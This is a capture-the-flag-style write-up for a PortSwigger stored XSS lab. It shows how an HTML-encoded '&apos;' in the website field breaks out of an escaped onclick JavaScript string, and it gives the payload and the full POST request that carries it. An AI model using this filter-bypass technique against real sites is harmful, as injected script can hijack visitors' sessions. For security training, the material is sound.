
# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/contexts



![img](images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/1.png)

---------------------------------------------

There is a function to post comments:



![img](images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/2.png)


It generates the following HTML code:



![img](images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/3.png)


```
<a id="author" href="http://test4.com" onclick="var tracker={track(){}};tracker.track('http://test4.com');">test2</a>
```


We see single quote and backslash characters are indeed escaped and angle brackets and double quotes are HTML-encoded:



![img](images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/4.png)


We will use “&apos;” next:

```
http://test4.com&apos;);alert(1);//
```

```
POST /post/comment HTTP/2
...

csrf=e8yz3UQ62qX7CBfs9PFEanjwdYjzbaMz&postId=1&comment=test1&name=test2&email=test3%40test.com&website=http%3A%2F%2Ftest4.com%26apos;);alert(1)%3b//
```

When clicking the username an alert pops:



![img](images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/5.png)